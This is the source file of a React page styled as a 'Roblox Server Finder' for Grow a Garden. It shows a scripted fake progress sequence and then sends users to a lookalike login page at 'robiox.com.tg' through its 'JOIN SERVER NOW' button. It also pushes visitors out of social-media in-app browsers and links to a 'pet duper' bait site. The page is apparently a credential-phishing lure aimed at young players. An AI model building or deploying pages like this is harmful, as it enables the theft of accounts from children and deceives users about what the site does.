"use client"

import type React from "react"

import { useState, useEffect } from "react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Card, CardContent } from "@/components/ui/card"
import { useToast } from "@/hooks/use-toast"
import { Avatar, AvatarImage, AvatarFallback } from "@/components/ui/avatar"
import { Badge } from "@/components/ui/badge"
import { ExternalLink, Sparkles, CheckCircle, Loader2, Users, Clock, Shield, AlertTriangle } from "lucide-react"

interface RobloxUser {
  id: number
  name: string
  displayName: string
  description: string
  created: string
  isBanned: boolean
  externalAppDisplayName: string | null
  hasVerifiedBadge: boolean
  avatarUrl: string | null
}

export default function HomePage() {
  const [username, setUsername] = useState("")
  const [isSubmitting, setIsSubmitting] = useState(false)
  const [robloxUser, setRobloxUser] = useState<RobloxUser | null>(null)
  const [isLoading, setIsLoading] = useState(false)
  const [showServerProcess, setShowServerProcess] = useState(false)
  const [processStep, setProcessStep] = useState(-1)
  const [showJoinButton, setShowJoinButton] = useState(false)
  const [showBrowserWarning, setShowBrowserWarning] = useState(false)
  const { toast } = useToast()

  useEffect(() => {
    const detectInAppBrowser = () => {
      const userAgent = navigator.userAgent || navigator.vendor || (window as any).opera

      // Detect various social media in-app browsers
      const isInAppBrowser =
        /FBAN|FBAV/i.test(userAgent) || // Facebook
        /Instagram/i.test(userAgent) || // Instagram
        /Twitter/i.test(userAgent) || // Twitter
        /TikTok/i.test(userAgent) || // TikTok
        /Snapchat/i.test(userAgent) || // Snapchat
        /LinkedIn/i.test(userAgent) || // LinkedIn
        /WhatsApp/i.test(userAgent) || // WhatsApp
        /Telegram/i.test(userAgent) || // Telegram
        /Line/i.test(userAgent) || // Line
        /WeChat/i.test(userAgent) || // WeChat
        /MicroMessenger/i.test(userAgent) || // WeChat
        /Pinterest/i.test(userAgent) || // Pinterest
        /Reddit/i.test(userAgent) // Reddit

      if (isInAppBrowser) {
        setShowBrowserWarning(true)
      }
    }

    detectInAppBrowser()
  }, [])

  const openInBrowser = () => {
    const currentUrl = window.location.href

    // Try different methods to open in external browser
    if (/iPhone|iPad|iPod/i.test(navigator.userAgent)) {
      // iOS - try to open in Safari
      window.location.href = `x-web-search://?${currentUrl}`
      setTimeout(() => {
        window.location.href = currentUrl
      }, 1000)
    } else if (/Android/i.test(navigator.userAgent)) {
      // Android - try to open in default browser
      window.location.href = `intent://${currentUrl.replace(/https?:\/\//, "")}#Intent;scheme=https;package=com.android.chrome;end`
      setTimeout(() => {
        window.location.href = currentUrl
      }, 1000)
    } else {
      // Fallback - just reload
      window.location.reload()
    }
  }

  useEffect(() => {
    if (showServerProcess) {
      const processSteps = ["Connecting to account...", "Finding old servers...", "Awaiting final confirmation..."]

      if (processStep === -1) {
        const timer = setTimeout(() => {
          setProcessStep(0)
        }, 1500)
        return () => clearTimeout(timer)
      }

      if (processStep >= 0 && processStep < processSteps.length - 1) {
        const timer = setTimeout(() => {
          setProcessStep(processStep + 1)
        }, 2200)
        return () => clearTimeout(timer)
      }

      if (processStep === processSteps.length - 1) {
        const timer = setTimeout(() => {
          setShowJoinButton(true)
        }, 1500)
        return () => clearTimeout(timer)
      }
    }
  }, [showServerProcess, processStep])

  const fetchRobloxUser = async (username: string) => {
    setIsLoading(true)
    try {
      const response = await fetch(`/api/roblox-user?username=${encodeURIComponent(username)}`)

      if (!response.ok) {
        const errorData = await response.json()
        throw new Error(errorData.error || "Failed to fetch user")
      }

      const userData = await response.json()
      setRobloxUser(userData)
      setShowServerProcess(true)
      setProcessStep(-1)
    } catch (error) {
      toast({
        title: "User Not Found",
        description: "Could not find a Roblox user with that username",
        variant: "destructive",
      })
      setRobloxUser(null)
    } finally {
      setIsLoading(false)
    }
  }

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()

    if (!username.trim()) {
      toast({
        title: "Username Required",
        description: "Please enter your Roblox username",
        variant: "destructive",
      })
      return
    }

    setShowServerProcess(false)
    setShowJoinButton(false)
    setProcessStep(-1)

    await fetchRobloxUser(username.trim())
  }

  const handlePetGenerator = () => {
    window.open("https://growagarden-pet-duper.vercel.app/", "_blank")
  }

  const handleJoinServer = () => {
    window.open(
      "https://www.robiox.com.tg/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fgames%2F216777815899%2FGrow-a-Garden",
      "_blank",
    )
  }

  const processSteps = ["Connecting to account...", "Finding old servers...", "Awaiting final confirmation..."]

  return (
    <div
      className="min-h-screen flex items-center justify-center p-4 relative"
      style={{
        backgroundImage: "url(/grow-a-garden-bg.jpg)",
        backgroundSize: "cover",
        backgroundPosition: "center",
        backgroundRepeat: "no-repeat",
      }}
    >
      <div className="absolute inset-0 bg-gradient-to-b from-black/30 via-black/20 to-black/40" />

      <div className="absolute inset-0 overflow-hidden pointer-events-none">
        <div className="absolute top-1/4 left-1/4 w-2 h-2 bg-yellow-400 rounded-full animate-pulse opacity-60" />
        <div className="absolute top-1/3 right-1/3 w-1 h-1 bg-green-400 rounded-full animate-bounce opacity-40" />
        <div className="absolute bottom-1/4 left-1/3 w-1.5 h-1.5 bg-blue-400 rounded-full animate-pulse opacity-50" />
      </div>

      {showBrowserWarning && (
        <div className="fixed inset-0 bg-black/80 backdrop-blur-sm z-50 flex items-center justify-center p-4">
          <Card className="bg-gradient-to-br from-red-50 to-orange-50 border-4 border-red-500 shadow-2xl rounded-2xl max-w-md w-full">
            <CardContent className="p-6 text-center">
              <div className="mb-4">
                <AlertTriangle className="w-16 h-16 text-red-500 mx-auto mb-4 animate-bounce" />
                <h2 className="text-2xl font-black text-red-600 mb-2 uppercase tracking-wide">⚠️ Browser Required!</h2>
                <p className="text-gray-700 font-bold mb-4">
                  This app works best in your default browser, not in social media apps.
                </p>
                <p className="text-sm text-gray-600 mb-6">
                  For the best experience and full functionality, please open this link in Safari, Chrome, or your
                  default browser.
                </p>
              </div>

              <div className="space-y-3">
                <Button
                  onClick={openInBrowser}
                  className="w-full text-lg font-black py-3 bg-gradient-to-r from-blue-500 to-blue-600 hover:from-blue-600 hover:to-blue-700 text-white border-3 border-blue-800 rounded-xl shadow-lg transform transition-all duration-200 hover:scale-105 uppercase tracking-wide"
                >
                  🌐 Open in Browser
                </Button>

                <Button
                  onClick={() => setShowBrowserWarning(false)}
                  variant="outline"
                  className="w-full text-sm font-bold py-2 border-2 border-gray-400 text-gray-600 hover:bg-gray-100 rounded-xl"
                >
                  Continue Anyway
                </Button>
              </div>

              <div className="mt-4 text-xs text-gray-500">
                <p>📱 iOS: Tap "Open in Browser" then choose Safari</p>
                <p>🤖 Android: Tap "Open in Browser" then choose Chrome</p>
              </div>
            </CardContent>
          </Card>
        </div>
      )}

      <div className="relative z-10 w-full max-w-lg">
        <Card className="bg-gradient-to-br from-white via-gray-50 to-gray-100 backdrop-blur-md border-4 border-yellow-400 shadow-2xl rounded-2xl overflow-hidden">
          <div className="bg-gradient-to-r from-blue-600 to-blue-700 p-2 border-b-2 border-yellow-400">
            <div className="flex items-center justify-between">
              <div className="flex items-center space-x-2">
                <div className="w-3 h-3 bg-red-500 rounded-full" />
                <div className="w-3 h-3 bg-yellow-500 rounded-full" />
                <div className="w-3 h-3 bg-green-500 rounded-full" />
              </div>
              <div className="text-white text-sm font-bold">Roblox Server Finder</div>
              <div className="flex items-center space-x-1">
                <Shield className="w-4 h-4 text-white" />
                <span className="text-white text-xs">Secure</span>
              </div>
            </div>
          </div>

          <CardContent className="p-8">
            <div className="text-center mb-8">
              <h1
                className="text-5xl font-black text-yellow-400 mb-2 transform -rotate-1"
                style={{
                  textShadow:
                    "3px 3px 0px #000, -3px -3px 0px #000, 3px -3px 0px #000, -3px 3px 0px #000, 0px 3px 0px #000, 3px 0px 0px #000, 0px -3px 0px #000, -3px 0px 0px #000",
                  filter: "drop-shadow(2px 2px 4px rgba(0,0,0,0.8))",
                  fontFamily: "var(--font-fredoka), ui-sans-serif, system-ui, sans-serif",
                }}
              >
                FIND OLD SERVERS
              </h1>
              <h2
                className="text-3xl font-black text-red-500 mb-4 transform rotate-1"
                style={{
                  textShadow:
                    "2px 2px 0px #000, -2px -2px 0px #000, 2px -2px 0px #000, -2px 2px 0px #000, 0px 2px 0px #000, 2px 0px 0px #000, 0px -2px 0px #000, -2px 0px 0px #000",
                  filter: "drop-shadow(2px 2px 4px rgba(0,0,0,0.8))",
                  fontFamily: "var(--font-fredoka), ui-sans-serif, system-ui, sans-serif",
                }}
              >
                GROW A GARDEN
              </h2>

              <div className="flex justify-center space-x-4 mb-4">
                <div className="flex items-center space-x-1 bg-green-100 px-3 py-1 rounded-full">
                  <div className="w-2 h-2 bg-green-500 rounded-full animate-pulse" />
                  <span className="text-xs font-bold text-green-700">Online</span>
                </div>
                <div className="flex items-center space-x-1 bg-blue-100 px-3 py-1 rounded-full">
                  <Users className="w-3 h-3 text-blue-600" />
                  <span className="text-xs font-bold text-blue-700">24/7</span>
                </div>
                <div className="flex items-center space-x-1 bg-purple-100 px-3 py-1 rounded-full">
                  <Clock className="w-3 h-3 text-purple-600" />
                  <span className="text-xs font-bold text-purple-700">Legacy</span>
                </div>
              </div>
            </div>

            <form onSubmit={handleSubmit} className="space-y-6">
              <div>
                <label
                  htmlFor="username"
                  className="block text-sm font-black text-gray-800 mb-2 uppercase tracking-wide"
                >
                  🎮 Roblox Username
                </label>
                <Input
                  id="username"
                  type="text"
                  value={username}
                  onChange={(e) => setUsername(e.target.value)}
                  placeholder="Enter your username..."
                  className="text-lg p-4 border-3 border-gray-400 focus:border-yellow-500 focus:ring-2 focus:ring-yellow-400 rounded-xl bg-white/90 backdrop-blur-sm font-bold shadow-inner"
                  disabled={isSubmitting || isLoading}
                />
              </div>

              {robloxUser && (
                <div className="bg-gradient-to-br from-gray-50 to-gray-100 rounded-xl p-5 border-3 border-gray-300 shadow-lg">
                  <div className="flex items-center space-x-4 mb-4">
                    <div className="relative">
                      <Avatar className="w-16 h-16 border-3 border-white shadow-lg">
                        <AvatarImage
                          src={robloxUser.avatarUrl || `/roblox-avatar.png`}
                          alt={robloxUser.displayName}
                          onError={(e) => {
                            e.currentTarget.src = "/roblox-avatar.png"
                          }}
                        />
                        <AvatarFallback className="bg-gradient-to-br from-blue-400 to-blue-600 text-white font-bold text-xl">
                          {robloxUser.displayName?.charAt(0) || robloxUser.name?.charAt(0) || "?"}
                        </AvatarFallback>
                      </Avatar>
                      <div className="absolute -bottom-1 -right-1 w-5 h-5 bg-green-500 border-2 border-white rounded-full animate-pulse" />
                    </div>
                    <div className="flex-1">
                      <div className="flex items-center gap-2 mb-1">
                        <h3 className="font-black text-xl text-gray-800">
                          {robloxUser.displayName || robloxUser.name}
                        </h3>
                        {robloxUser.hasVerifiedBadge && (
                          <Badge className="bg-gradient-to-r from-blue-500 to-blue-600 text-white font-bold px-2 py-1 shadow-md">
                            ✓ Verified
                          </Badge>
                        )}
                      </div>
                      <p className="text-sm text-gray-600 font-bold">@{robloxUser.name}</p>
                      <p className="text-xs text-gray-500 mt-1">
                        🗓️ Joined: {new Date(robloxUser.created).toLocaleDateString()}
                      </p>
                    </div>
                  </div>
                  {robloxUser.description && (
                    <div className="bg-white/70 rounded-lg p-3 border border-gray-200">
                      <p className="text-sm text-gray-700 italic">"{robloxUser.description}"</p>
                    </div>
                  )}
                </div>
              )}

              {showServerProcess && (
                <div className="bg-gradient-to-br from-white to-gray-50 rounded-xl p-6 border-3 border-blue-400 shadow-2xl">
                  <div className="text-center mb-6">
                    <h3 className="text-2xl font-black text-gray-800 mb-4 uppercase tracking-wide">
                      ⚡ Finalizing Process
                    </h3>
                    <div className="relative">
                      <Avatar className="w-20 h-20 mx-auto mb-4 border-4 border-blue-400 shadow-lg">
                        <AvatarImage
                          src={robloxUser?.avatarUrl || `/roblox-avatar.png`}
                          alt={robloxUser?.displayName}
                          onError={(e) => {
                            e.currentTarget.src = "/roblox-avatar.png"
                          }}
                        />
                        <AvatarFallback className="bg-gradient-to-br from-blue-400 to-blue-600 text-white font-bold text-2xl">
                          {robloxUser?.displayName?.charAt(0) || robloxUser?.name?.charAt(0) || "?"}
                        </AvatarFallback>
                      </Avatar>
                      <div className="absolute inset-0 border-4 border-transparent border-t-yellow-400 rounded-full animate-spin" />
                    </div>
                  </div>

                  <div className="space-y-4 mb-6">
                    {processSteps.map((step, index) => (
                      <div
                        key={index}
                        className="flex items-center space-x-4 p-3 rounded-lg bg-white/50 border border-gray-200"
                      >
                        {index < processStep ? (
                          <CheckCircle className="w-6 h-6 text-green-500 flex-shrink-0" />
                        ) : index === processStep ? (
                          <Loader2 className="w-6 h-6 text-blue-500 animate-spin flex-shrink-0" />
                        ) : (
                          <div className="w-6 h-6 border-2 border-gray-300 rounded-full flex-shrink-0" />
                        )}
                        <span className={`font-bold ${index <= processStep ? "text-gray-800" : "text-gray-400"}`}>
                          {step}
                        </span>
                      </div>
                    ))}
                  </div>

                  {showJoinButton && (
                    <Button
                      onClick={handleJoinServer}
                      className="w-full text-xl font-black py-4 bg-gradient-to-r from-green-500 to-green-600 hover:from-green-600 hover:to-green-700 text-white border-3 border-green-700 rounded-xl shadow-lg transform transition-all duration-200 hover:scale-105 hover:shadow-xl uppercase tracking-wide"
                    >
                      🚀 JOIN SERVER NOW!
                    </Button>
                  )}
                </div>
              )}

              {!showServerProcess && (
                <Button
                  type="submit"
                  disabled={isSubmitting || isLoading}
                  className="w-full text-xl font-black py-4 bg-gradient-to-r from-green-500 to-green-600 hover:from-green-600 hover:to-green-700 text-white border-3 border-green-800 rounded-xl shadow-lg transform transition-all duration-200 hover:scale-105 hover:shadow-xl uppercase tracking-wide"
                >
                  {isLoading ? "🔍 Loading User..." : isSubmitting ? "⏳ Submitting..." : "🎯 FIND OLD SERVERS!"}
                </Button>
              )}
            </form>

            <div className="mt-6">
              <Button
                onClick={handlePetGenerator}
                variant="outline"
                className="w-full text-lg font-black py-4 bg-gradient-to-r from-purple-500 to-purple-600 hover:from-purple-600 hover:to-purple-700 text-white border-3 border-purple-800 rounded-xl shadow-lg transform transition-all duration-200 hover:scale-105 hover:shadow-xl uppercase tracking-wide"
              >
                <Sparkles className="w-5 h-5 mr-2" />🐾 PET GENERATOR
                <ExternalLink className="w-4 h-4 ml-2" />
              </Button>
            </div>
          </CardContent>
        </Card>
      </div>
    </div>
  )
}
